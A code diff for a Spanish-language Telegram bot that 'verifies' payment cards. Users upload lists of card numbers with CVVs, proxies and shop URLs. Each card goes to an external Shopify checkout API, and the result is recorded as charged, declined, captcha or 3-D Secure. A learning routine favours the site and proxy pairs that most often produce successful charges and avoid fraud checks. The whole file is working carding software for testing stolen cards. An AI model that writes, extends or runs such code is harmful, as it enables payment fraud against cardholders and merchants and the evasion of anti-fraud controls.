@@ -1,7 +1,7 @@
 # -*- coding: utf-8 -*-
 """
-Bot de Telegram para verificar tarjetas - VERSIÓN ÉLITE ULTRA (SIN REINTENTOS)
-Con formato profesional, UltraHealth para proxies, sin reintentos en verificaciones.
+Bot de Telegram para verificar tarjetas - VERSIÓN COMPLETA RESTAURADA
+Con detección inteligente de archivos, aprendizaje avanzado, sin reintentos.
 """
 
 import os
@@ -27,22 +27,19 @@ from telegram import Update, Document, InlineKeyboardButton, InlineKeyboardMarku
 from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes, CallbackQueryHandler
 import aiohttp
 
-# ================== MANEJO DE SEÑALES PARA RAILWAY ==================
+# ================== MANEJO DE SEÑALES ==================
 def handle_shutdown(signum, frame):
-    """Maneja señales de terminación"""
     logger.info(f"🛑 Recibida señal {signum}, cerrando gracefulmente...")
     sys.exit(0)
 
-# Registrar manejadores de señales
 signal.signal(signal.SIGTERM, handle_shutdown)
 signal.signal(signal.SIGINT, handle_shutdown)
 
-# ================== CONFIGURACIÓN SEGURA ==================
+# ================== CONFIGURACIÓN ==================
 TOKEN = os.environ.get("BOT_TOKEN")
 if not TOKEN:
     raise ValueError("❌ ERROR: BOT_TOKEN no está configurado")
 
-# API Endpoints
 API_ENDPOINTS = [
     os.environ.get("API_URL", "https://auto-shopify-api-production.up.railway.app/index.php"),
 ]
@@ -51,63 +48,46 @@ DB_FILE = os.environ.get("DB_FILE", "bot_database.db")
 MAX_WORKERS_PER_USER = int(os.environ.get("MAX_WORKERS", 8))
 RATE_LIMIT_SECONDS = int(os.environ.get("RATE_LIMIT", 2))
 DAILY_LIMIT_CHECKS = int(os.environ.get("DAILY_LIMIT", 1000))
-MASS_LIMIT_PER_HOUR = int(os.environ.get("MASS_LIMIT", 5))
 ADMIN_IDS = [int(id) for id in os.environ.get("ADMIN_IDS", "").split(",") if id]
 
-# Logging profesional
 logging.basicConfig(
     format="%(asctime)s - %(name)s - %(levelname)s - %(message)s",
     level=logging.INFO
 )
 logger = logging.getLogger(__name__)
 
-# ID único para esta instancia
 INSTANCE_ID = os.environ.get("RAILWAY_DEPLOYMENT_ID", str(time.time()))
 
-# ================== FUNCIÓN PARA BARRA DE PROGRESO ==================
+# ================== FUNCIONES AUXILIARES ==================
 def create_progress_bar(current: int, total: int, width: int = 20) -> str:
-    """Crea una barra de progreso visual"""
     if total == 0:
         return "[" + "░" * width + "]"
     filled = int((current / total) * width)
     bar = "█" * filled + "░" * (width - filled)
     return f"[{bar}]"
 
-# ================== FUNCIÓN PARA FORMATO DE PRECIO ==================
 def format_price(price_str: str) -> str:
-    """Extrae y formatea el precio de la respuesta de manera robusta"""
     try:
-        # Patrones comunes de precio en respuestas
         patterns = [
-            r'\$?(\d+\.\d{2})',           # $14.95 o 14.95
-            r'Price["\s:]+(\d+\.\d{2})',   # "Price":"14.95"
-            r'amount["\s:]+(\d+\.\d{2})',  # "amount":14.95
-            r'(\d+\.\d{2})\s*USD',         # 14.95 USD
-            r'USD\s*(\d+\.\d{2})',         # USD 14.95
-            r'total["\s:]+(\d+\.\d{2})',   # "total":14.95
-            r'value["\s:]+(\d+\.\d{2})',   # "value":14.95
+            r'\$?(\d+\.\d{2})',
+            r'Price["\s:]+(\d+\.\d{2})',
+            r'amount["\s:]+(\d+\.\d{2})',
+            r'(\d+\.\d{2})\s*USD',
+            r'USD\s*(\d+\.\d{2})',
         ]
-        
         for pattern in patterns:
             match = re.search(pattern, price_str, re.IGNORECASE)
             if match:
                 return f"${match.group(1)}"
-        
-        # Si no encuentra patrón, buscar cualquier número con 2 decimales
         match = re.search(r'(\d+\.\d{2})', price_str)
         if match:
             return f"${match.group(1)}"
-            
-    except Exception as e:
-        logger.debug(f"Error formateando precio: {e}")
-    
+    except:
+        pass
     return "N/A"
 
-# ================== FUNCIÓN PARA CONSULTAR BIN ==================
 async def get_bin_info(bin_code: str) -> Dict:
-    """Consulta información de BIN usando API externa con aiohttp"""
     try:
-        # Usar API gratuita de BIN
         async with aiohttp.ClientSession() as session:
             async with session.get(f"https://lookup.binlist.net/{bin_code}", timeout=5) as resp:
                 if resp.status == 200:
@@ -119,11 +99,8 @@ async def get_bin_info(bin_code: str) -> Dict:
                         "type": data.get("type", "Unknown"),
                         "level": data.get("brand", "Unknown")
                     }
-    except asyncio.TimeoutError:
-        logger.debug(f"Timeout consultando BIN {bin_code}")
-    except Exception as e:
-        logger.debug(f"Error consultando BIN {bin_code}: {e}")
-    
+    except:
+        pass
     return {
         "bank": "Unknown",
         "brand": "UNKNOWN",
@@ -145,7 +122,6 @@ class CheckStatus(Enum):
 
 @dataclass
 class CheckResult:
-    """Resultado de una verificación"""
     card_bin: str
     card_last4: str
     site: str
@@ -181,14 +157,10 @@ class CardValidator:
             exp_year = int(year)
             if len(year) == 2:
                 exp_year += 2000
-            
             now = datetime.now()
-            current_year = now.year
-            current_month = now.month
-            
-            if exp_year < current_year:
+            if exp_year < now.year:
                 return False
-            if exp_year == current_year and exp_month < current_month:
+            if exp_year == now.year and exp_month < now.month:
                 return False
             return True
         except:
@@ -203,9 +175,7 @@ class CardValidator:
         parts = card_str.split('|')
         if len(parts) != 4:
             return None
-        
         number, month, year, cvv = parts
-        
         if not number.isdigit() or len(number) < 13 or len(number) > 19:
             return None
         if not CardValidator.luhn_check(number):
@@ -214,7 +184,6 @@ class CardValidator:
             return None
         if not CardValidator.validate_cvv(cvv):
             return None
-            
         return {
             "number": number,
             "month": month,
@@ -224,28 +193,59 @@ class CardValidator:
             "last4": number[-4:]
         }
 
-# ================== DETECCIÓN DE ARCHIVOS ==================
+# ================== DETECCIÓN INTELIGENTE DE ARCHIVOS (RESTAURADA) ==================
 def detect_line_type(line: str) -> Tuple[str, Optional[str]]:
+    """
+    Detección INTELIGENTE de tipo de línea.
+    Analiza el contenido REAL, no solo el formato superficial.
+    """
     line = line.strip()
     if not line:
         return None, None
 
+    # ===== 1. DETECTAR SITIOS (URLs) =====
     if line.startswith(('http://', 'https://')):
-        return 'site', line
+        rest = line.split('://')[1]
+        if '.' in rest and not rest.startswith('.') and ' ' not in rest:
+            return 'site', line
 
+    # ===== 2. DETECTAR TARJETAS =====
     if '|' in line:
         parts = line.split('|')
         if len(parts) == 4:
-            return 'card', line
+            numero, mes, año, cvv = parts
+            if (numero.isdigit() and len(numero) >= 13 and len(numero) <= 19 and
+                mes.isdigit() and 1 <= int(mes) <= 12 and
+                año.isdigit() and len(año) in (2, 4) and
+                cvv.isdigit() and len(cvv) in (3, 4)):
+                if CardValidator.luhn_check(numero):
+                    return 'card', line
 
-    if ':' in line:
+    # ===== 3. DETECTAR PROXIES =====
+    if not line.startswith(('http://', 'https://')):
         parts = line.split(':')
-        if len(parts) in [2, 4] or (len(parts) == 3 and parts[2] == ''):
-            return 'proxy', line
+        
+        if len(parts) == 2:
+            host, port = parts
+            if port.isdigit() and 1 <= int(port) <= 65535:
+                if re.match(r'^[a-zA-Z0-9\.\-_]+$', host):
+                    return 'proxy', line
+        
+        elif len(parts) == 4:
+            host, port, user, password = parts
+            if port.isdigit() and 1 <= int(port) <= 65535:
+                if re.match(r'^[a-zA-Z0-9\.\-_]+$', host):
+                    return 'proxy', line
+        
+        elif len(parts) == 3 and parts[2] == '':
+            host, port, _ = parts
+            if port.isdigit() and 1 <= int(port) <= 65535:
+                if re.match(r'^[a-zA-Z0-9\.\-_]+$', host):
+                    return 'proxy', line
 
     return None, None
 
-# ================== BASE DE DATOS ==================
+# ================== BASE DE DATOS CON MIGRACIÓN (RESTAURADA) ==================
 class Database:
     def __init__(self, db_path=DB_FILE):
         self.db_path = db_path
@@ -255,10 +255,33 @@ class Database:
         self._batch_task = None
         self._initialized = False
         
+    def _migrate_if_needed(self):
+        with sqlite3.connect(self.db_path) as conn:
+            cursor = conn.cursor()
+            cursor.execute("PRAGMA table_info(learning)")
+            columns = [col[1] for col in cursor.fetchall()]
+            
+            if 'captcha' not in columns:
+                cursor.execute("ALTER TABLE learning ADD COLUMN captcha INTEGER DEFAULT 0")
+                logger.info("✅ Columna 'captcha' añadida")
+            
+            if 'three_ds' not in columns:
+                cursor.execute("ALTER TABLE learning ADD COLUMN three_ds INTEGER DEFAULT 0")
+                logger.info("✅ Columna 'three_ds' añadida")
+            
+            if 'consecutive_fails' not in columns:
+                cursor.execute("ALTER TABLE learning ADD COLUMN consecutive_fails INTEGER DEFAULT 0")
+                logger.info("✅ Columna 'consecutive_fails' añadida")
+            
+            if 'last_success' not in columns:
+                cursor.execute("ALTER TABLE learning ADD COLUMN last_success TIMESTAMP")
+                logger.info("✅ Columna 'last_success' añadida")
+            
+            conn.commit()
+        
     def _init_db_sync(self):
         with sqlite3.connect(self.db_path) as conn:
             conn.execute("PRAGMA journal_mode=WAL")
-            
             cursor = conn.cursor()
             
             cursor.execute('''
@@ -282,11 +305,16 @@ class Database:
                     timeouts INTEGER DEFAULT 0,
                     declines INTEGER DEFAULT 0,
                     charged INTEGER DEFAULT 0,
+                    captcha INTEGER DEFAULT 0,
+                    three_ds INTEGER DEFAULT 0,
                     total_time REAL DEFAULT 0,
                     last_seen TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
+                    last_success TIMESTAMP,
+                    consecutive_fails INTEGER DEFAULT 0,
                     UNIQUE(user_id, site, proxy)
                 )
             ''')
+            cursor.execute('CREATE INDEX IF NOT EXISTS idx_learning_user ON learning(user_id)')
             
             cursor.execute('''
                 CREATE TABLE IF NOT EXISTS results (
@@ -299,38 +327,56 @@ class Database:
                     status TEXT,
                     response_time REAL,
                     http_code INTEGER,
-                    price TEXT,
-                    bin_info TEXT,
+                    api_used TEXT,
+                    response_text TEXT,
                     created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
                 )
             ''')
+            cursor.execute('CREATE INDEX IF NOT EXISTS idx_results_user ON results(user_id)')
             
             cursor.execute('''
                 CREATE TABLE IF NOT EXISTS rate_limits (
                     user_id INTEGER PRIMARY KEY,
                     last_command TIMESTAMP,
                     checks_today INTEGER DEFAULT 0,
-                    last_reset DATE DEFAULT CURRENT_DATE
+                    last_reset DATE DEFAULT CURRENT_DATE,
+                    mass_hour INTEGER DEFAULT 0,
+                    last_mass TIMESTAMP,
+                    timeout_count INTEGER DEFAULT 0,
+                    abuse_warnings INTEGER DEFAULT 0,
+                    banned_until TIMESTAMP
+                )
+            ''')
+            
+            cursor.execute('''
+                CREATE TABLE IF NOT EXISTS proxy_stats (
+                    id INTEGER PRIMARY KEY AUTOINCREMENT,
+                    user_id INTEGER,
+                    proxy TEXT,
+                    alive INTEGER DEFAULT 0,
+                    response_time REAL DEFAULT 0,
+                    last_check TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
+                    ip TEXT,
+                    error TEXT,
+                    UNIQUE(user_id, proxy)
                 )
             ''')
             
             conn.commit()
+        self._migrate_if_needed()
 
     async def initialize(self):
         if self._initialized:
             return
-        
         loop = asyncio.get_event_loop()
         await loop.run_in_executor(None, self._init_db_sync)
         self._initialized = True
-        logger.info("✅ Base de datos inicializada")
+        logger.info(f"✅ Base de datos inicializada [Instancia: {INSTANCE_ID}]")
 
     async def execute(self, query: str, params: tuple = ()):
         async with self._write_lock:
             loop = asyncio.get_event_loop()
-            return await loop.run_in_executor(
-                None, lambda: self._sync_execute(query, params)
-            )
+            return await loop.run_in_executor(None, lambda: self._sync_execute(query, params))
 
     def _sync_execute(self, query: str, params: tuple):
         with sqlite3.connect(self.db_path) as conn:
@@ -341,9 +387,7 @@ class Database:
 
     async def fetch_one(self, query: str, params: tuple = ()):
         loop = asyncio.get_event_loop()
-        return await loop.run_in_executor(
-            None, lambda: self._sync_fetch_one(query, params)
-        )
+        return await loop.run_in_executor(None, lambda: self._sync_fetch_one(query, params))
 
     def _sync_fetch_one(self, query: str, params: tuple):
         with sqlite3.connect(self.db_path) as conn:
@@ -355,9 +399,7 @@ class Database:
 
     async def fetch_all(self, query: str, params: tuple = ()):
         loop = asyncio.get_event_loop()
-        return await loop.run_in_executor(
-            None, lambda: self._sync_fetch_all(query, params)
-        )
+        return await loop.run_in_executor(None, lambda: self._sync_fetch_all(query, params))
 
     def _sync_fetch_all(self, query: str, params: tuple):
         with sqlite3.connect(self.db_path) as conn:
@@ -370,12 +412,12 @@ class Database:
         await self.execute(
             """INSERT INTO results 
                (user_id, card_bin, card_last4, site, proxy, status, 
-                response_time, http_code, price, bin_info)
+                response_time, http_code, api_used, response_text)
                VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?)""",
             (user_id, result.card_bin, result.card_last4, 
              result.site, result.proxy, result.status.value,
-             result.response_time, result.http_code, result.price,
-             json.dumps(result.bin_info))
+             result.response_time, result.http_code, result.api_used,
+             result.response_text[:200])
         )
 
     async def shutdown(self):
@@ -451,50 +493,86 @@ class ProxyHealthChecker:
         
         return final_results
 
-# ================== SISTEMA DE APRENDIZAJE ==================
+# ================== SISTEMA DE APRENDIZAJE AVANZADO (RESTAURADO) ==================
 class LearningSystem:
     def __init__(self, db: Database, user_id: int):
         self.db = db
         self.user_id = user_id
-        self.EPSILON = 0.1
+        self.BASE_EPSILON = 0.15
+        self.MIN_EPSILON = 0.05
+        self.DECAY_LAMBDA = 0.02
+        self._score_cache = {}
+        self._cache_time = {}
+        self._stats_lock = asyncio.Lock()
+
+    def _get_dynamic_epsilon(self, total_attempts: int) -> float:
+        if total_attempts < 50:
+            return self.BASE_EPSILON
+        decay = max(0, 1 - (total_attempts - 50) / 500)
+        return max(self.MIN_EPSILON, self.BASE_EPSILON * decay)
 
     async def update(self, result: CheckResult):
         site = result.site
         proxy = result.proxy
         elapsed = result.response_time
         
-        existing = await self.db.fetch_one(
-            "SELECT * FROM learning WHERE user_id = ? AND site = ? AND proxy = ?",
-            (self.user_id, site, proxy)
-        )
-        
-        if existing:
-            attempts = existing["attempts"] + 1
-            successes = existing["successes"] + (1 if result.success else 0)
-            timeouts = existing["timeouts"] + (1 if result.status == CheckStatus.TIMEOUT else 0)
-            declines = existing["declines"] + (1 if result.status == CheckStatus.DECLINED else 0)
-            charged = existing["charged"] + (1 if result.status == CheckStatus.CHARGED else 0)
-            total_time = existing["total_time"] + elapsed
+        async with self._stats_lock:
+            existing = await self.db.fetch_one(
+                "SELECT * FROM learning WHERE user_id = ? AND site = ? AND proxy = ?",
+                (self.user_id, site, proxy)
+            )
             
-            await self.db.execute(
-                """UPDATE learning SET 
-                   attempts = ?, successes = ?, timeouts = ?, declines = ?,
-                   charged = ?, total_time = ?, last_seen = CURRENT_TIMESTAMP
-                   WHERE id = ?""",
-                (attempts, successes, timeouts, declines, charged, total_time, existing["id"])
-            )
-        else:
-            await self.db.execute(
-                """INSERT INTO learning 
-                   (user_id, site, proxy, attempts, successes, timeouts, declines, charged, total_time)
-                   VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)""",
-                (self.user_id, site, proxy, 1, 1 if result.success else 0,
-                 1 if result.status == CheckStatus.TIMEOUT else 0,
-                 1 if result.status == CheckStatus.DECLINED else 0,
-                 1 if result.status == CheckStatus.CHARGED else 0, elapsed)
-            )
+            if existing:
+                days_old = (datetime.now() - datetime.fromisoformat(existing["last_seen"])).days
+                decay = math.exp(-self.DECAY_LAMBDA * days_old) if days_old > 0 else 1.0
+                
+                attempts = int(existing["attempts"] * decay) + 1
+                successes = int(existing["successes"] * decay) + (1 if result.success else 0)
+                timeouts = int(existing["timeouts"] * decay) + (1 if result.status == CheckStatus.TIMEOUT else 0)
+                declines = int(existing["declines"] * decay) + (1 if result.status == CheckStatus.DECLINED else 0)
+                charged = int(existing["charged"] * decay) + (1 if result.status == CheckStatus.CHARGED else 0)
+                captcha = int(existing["captcha"] * decay) + (1 if result.status == CheckStatus.CAPTCHA else 0)
+                three_ds = int(existing["three_ds"] * decay) + (1 if result.status == CheckStatus.THREE_DS else 0)
+                total_time = existing["total_time"] * decay + elapsed
+                
+                consecutive_fails = existing["consecutive_fails"] + 1 if not result.success else 0
+                
+                await self.db.execute(
+                    """UPDATE learning SET 
+                       attempts = ?, successes = ?, timeouts = ?, declines = ?,
+                       charged = ?, captcha = ?, three_ds = ?, total_time = ?,
+                       last_seen = CURRENT_TIMESTAMP,
+                       last_success = CASE WHEN ? THEN CURRENT_TIMESTAMP ELSE last_success END,
+                       consecutive_fails = ?
+                       WHERE id = ?""",
+                    (attempts, successes, timeouts, declines, charged, captcha, three_ds,
+                     total_time, result.success, consecutive_fails, existing["id"])
+                )
+            else:
+                await self.db.execute(
+                    """INSERT INTO learning 
+                       (user_id, site, proxy, attempts, successes, timeouts, declines, 
+                        charged, captcha, three_ds, total_time, consecutive_fails)
+                       VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)""",
+                    (self.user_id, site, proxy, 1, 1 if result.success else 0,
+                     1 if result.status == CheckStatus.TIMEOUT else 0,
+                     1 if result.status == CheckStatus.DECLINED else 0,
+                     1 if result.status == CheckStatus.CHARGED else 0,
+                     1 if result.status == CheckStatus.CAPTCHA else 0,
+                     1 if result.status == CheckStatus.THREE_DS else 0,
+                     elapsed, 0)
+                )
+            
+            self._score_cache.pop(f"{site}|{proxy}", None)
 
     async def get_score(self, site: str, proxy: str) -> float:
+        cache_key = f"{site}|{proxy}"
+        
+        if cache_key in self._score_cache:
+            cache_time, score = self._score_cache[cache_key]
+            if (datetime.now() - cache_time).seconds < 300:
+                return score
+        
         row = await self.db.fetch_one(
             "SELECT * FROM learning WHERE user_id = ? AND site = ? AND proxy = ?",
             (self.user_id, site, proxy)
@@ -505,15 +583,38 @@ class LearningSystem:
         
         attempts = row["attempts"]
         charged = row["charged"]
+        timeouts = row["timeouts"]
+        declines = row["declines"]
+        captcha = row["captcha"]
+        three_ds = row["three_ds"]
+        consecutive_fails = row["consecutive_fails"]
         avg_time = row["total_time"] / attempts if attempts > 0 else 1.0
         
         success_rate = charged / attempts
+        timeout_penalty = 0.5 * (timeouts / attempts)
+        decline_penalty = 0.2 * (declines / attempts)
+        captcha_penalty = 0.8 * (captcha / attempts)
+        threeds_penalty = 0.6 * (three_ds / attempts)
+        consecutive_penalty = 0.1 * consecutive_fails if consecutive_fails > 3 else 0
+        
         speed_score = 1.0 / (avg_time + 0.5)
         
-        return success_rate * 1.5 + speed_score * 0.5
+        score = (success_rate * 2.0 - timeout_penalty - decline_penalty - 
+                 captcha_penalty - threeds_penalty - consecutive_penalty + speed_score)
+        score = max(0.1, min(2.0, score))
+        
+        self._score_cache[cache_key] = (datetime.now(), score)
+        return score
 
     async def choose_combination(self, sites: List[str], proxies: List[str]) -> Tuple[str, str]:
-        if random.random() < self.EPSILON:
+        total = await self.db.fetch_one(
+            "SELECT SUM(attempts) as total FROM learning WHERE user_id = ?",
+            (self.user_id,)
+        )
+        total_attempts = total["total"] if total and total["total"] else 0
+        epsilon = self._get_dynamic_epsilon(total_attempts)
+        
+        if random.random() < epsilon:
             return random.choice(sites), random.choice(proxies)
         
         scores = []
@@ -538,6 +639,7 @@ class UltraFastChecker:
         self.connector = aiohttp.TCPConnector(limit=200, ttl_dns_cache=300)
         await self._create_sessions()
         self._initialized = True
+        logger.info(f"✅ Checker inicializado [Instancia: {INSTANCE_ID}]")
 
     async def _create_sessions(self):
         for _ in range(30):
@@ -576,16 +678,13 @@ class UltraFastChecker:
         session = await self.get_session()
         start_time = time.time()
         
-        # Obtener información del BIN
         bin_info = await get_bin_info(card_data['bin'])
         
         try:
-            # SOLO UN INTENTO - SIN REINTENTOS
             async with session.get(API_ENDPOINTS[0], params=params, timeout=10) as resp:
                 elapsed = time.time() - start_time
                 response_text = await resp.text()
                 
-                # Determinar estado
                 status = CheckStatus.UNKNOWN
                 success = False
                 
@@ -606,7 +705,6 @@ class UltraFastChecker:
                 elif resp.status >= 400:
                     status = CheckStatus.DECLINED
                 
-                # Extraer precio
                 price = format_price(response_text)
                 
                 return CheckResult(
@@ -641,23 +739,6 @@ class UltraFastChecker:
                 price="$0.00",
                 error="Timeout"
             )
-        except aiohttp.ClientError as e:
-            elapsed = time.time() - start_time
-            return CheckResult(
-                card_bin=card_data['bin'],
-                card_last4=card_data['last4'],
-                site=site,
-                proxy=proxy,
-                status=CheckStatus.ERROR,
-                response_time=elapsed,
-                http_code=None,
-                response_text="",
-                api_used=API_ENDPOINTS[0],
-                success=False,
-                bin_info=bin_info,
-                price="$0.00",
-                error=str(e)
-            )
         except Exception as e:
             elapsed = time.time() - start_time
             logger.error(f"Error inesperado: {e}", exc_info=True)
@@ -683,6 +764,7 @@ class UltraFastChecker:
 class UserManager:
     def __init__(self, db: Database):
         self.db = db
+        self.users: Dict[int, Any] = {}
 
     async def get_user_data(self, user_id: int) -> Dict:
         row = await self.db.fetch_one(
@@ -1433,7 +1515,7 @@ async def stop_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
         parse_mode="Markdown"
     )
 
-# ===== MANEJO DE ARCHIVOS =====
+# ===== MANEJO DE ARCHIVOS CON DETECCIÓN INTELIGENTE (RESTAURADA) =====
 async def handle_document(update: Update, context: ContextTypes.DEFAULT_TYPE):
     document = update.message.document
     if not document.file_name.endswith('.txt'):
@@ -1445,31 +1527,76 @@ async def handle_document(update: Update, context: ContextTypes.DEFAULT_TYPE):
     text = file_content.decode('utf-8', errors='ignore')
     lines = text.splitlines()
     
+    sites_added = []
+    proxies_added = []
     cards_added = []
-    invalid = []
+    invalid_cards = []
+    unknown = []
     
-    for line in lines:
-        line = line.strip()
+    for raw_line in lines:
+        line = raw_line.strip()
         if not line:
             continue
-        if CardValidator.parse_card(line):
-            cards_added.append(line)
+        
+        line_type, normalized = detect_line_type(line)
+        
+        if line_type == 'site':
+            sites_added.append(normalized)
+        elif line_type == 'proxy':
+            proxies_added.append(normalized)
+        elif line_type == 'card':
+            card_data = CardValidator.parse_card(normalized)
+            if card_data:
+                cards_added.append(normalized)
+            else:
+                invalid_cards.append(normalized)
         else:
-            invalid.append(line)
+            unknown.append(line)
     
     user_id = update.effective_user.id
     user_data = await user_manager.get_user_data(user_id)
-    user_data["cards"].extend(cards_added)
-    await user_manager.update_user_data(user_id, cards=user_data["cards"])
+    updated = False
     
-    await update.message.reply_text(
-        f"📥 *CARDS IMPORTED* 📥\n"
-        f"━━━━━━━━━━━━━━━━━━━━━\n\n"
-        f"• ✅ VALID: `{len(cards_added)}`\n"
-        f"• ❌ INVALID: `{len(invalid)}`\n\n"
-        f"Total cards: `{len(user_data['cards'])}`",
-        parse_mode="Markdown"
-    )
+    if sites_added:
+        user_data["sites"].extend(sites_added)
+        updated = True
+    if proxies_added:
+        normalized_proxies = []
+        for p in proxies_added:
+            if p.count(':') == 1:
+                normalized_proxies.append(f"{p}::")
+            else:
+                normalized_proxies.append(p)
+        user_data["proxies"].extend(normalized_proxies)
+        updated = True
+    if cards_added:
+        user_data["cards"].extend(cards_added)
+        updated = True
+    
+    if updated:
+        await user_manager.update_user_data(
+            user_id, 
+            sites=user_data["sites"], 
+            proxies=user_data["proxies"], 
+            cards=user_data["cards"]
+        )
+    
+    msg_parts = []
+    if sites_added:
+        msg_parts.append(f"✅ {len(sites_added)} sitio(s) añadido(s)")
+    if proxies_added:
+        msg_parts.append(f"✅ {len(proxies_added)} proxy(s) añadido(s)")
+    if cards_added:
+        msg_parts.append(f"✅ {len(cards_added)} tarjeta(s) válida(s) añadida(s)")
+    if invalid_cards:
+        msg_parts.append(f"⚠️ {len(invalid_cards)} tarjeta(s) inválida(s) rechazada(s)")
+    if unknown:
+        msg_parts.append(f"⚠️ {len(unknown)} línea(s) no reconocida(s)")
+    
+    if not msg_parts:
+        await update.message.reply_text("❌ No se encontraron datos válidos.")
+    else:
+        await update.message.reply_text("\n".join(msg_parts))
 
 # ===== CALLBACKS =====
 async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
@@ -1564,7 +1691,7 @@ def main():
     # Callbacks
     app.add_handler(CallbackQueryHandler(button_callback))
 
-    logger.info("🚀 Bot started (sin reintentos)")
+    logger.info("🚀 Bot started (versión completa restaurada)")
     app.run_polling()
 
 if __name__ == "__main__":
